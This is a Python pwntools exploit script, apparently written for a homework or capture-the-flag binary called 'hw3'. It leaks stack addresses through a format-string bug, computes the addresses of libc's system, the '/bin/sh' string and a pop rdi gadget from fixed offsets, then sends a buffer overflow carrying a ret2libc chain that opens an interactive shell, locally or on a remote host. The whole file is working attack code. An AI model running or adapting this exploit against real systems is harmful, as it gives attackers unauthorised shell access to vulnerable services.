#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath], gdbscript=gdbscript, aslr=True)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath])


binPath="./hw3"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *order+80
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="info"
io = start()

io.sendline("2")
io.recvuntil("Enter your order number>\n")
io.sendline("%23$p")
binsh1=io.recvline()

io.sendline("2")
io.recvuntil("Enter your order number>\n")
io.sendline("%23$p")
sys1=io.recvline()

io.sendline("2")
io.recvuntil("Enter your order number>\n")
io.sendline("%11$p")
rdi1=io.recvline()


myStr=binsh1.strip().decode("utf-8")
myStr1=sys1.strip().decode("utf-8")
myStr2=rdi1.strip().decode("utf-8")
binsh2=myStr[13:]
sys2=myStr1[13:]
rdi2=myStr2[13:]
print("the address from where the system and bin/sh needs to be calculated leaked from the stack is:")
print(binsh2)
print("the address from where pop rdi gadget need to be calculated is:")
print(rdi2)


binsh3=int( binsh2, 16)
sys3=int( sys2, 16)
rdi3= int( rdi2, 16)

binsh3=binsh3 +int(1511557)
sys3=sys3 +int (139363)
rdi3=rdi3+ int(91)


io.sendline("1")

elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

# define payload
overFlow = b'A'*72
nops=b'\x90' * 8
stacksmash=pwn.p64(0xf007ba11f007ba11)
libCSystem = pwn.p64(sys3)
popRDI = pwn.p64(rdi3)
#popRDI = pwn.p64(0x7ffff7ff546b)
binSH = pwn.p64(binsh3)

payload = pwn.flat(
        [
            overFlow,
            stacksmash,
            nops,
            popRDI,
            binSH,
            libCSystem
           ]
        )
pwn.info("Payload length: %d",len(payload))

io.sendline(payload)
io.interactive()

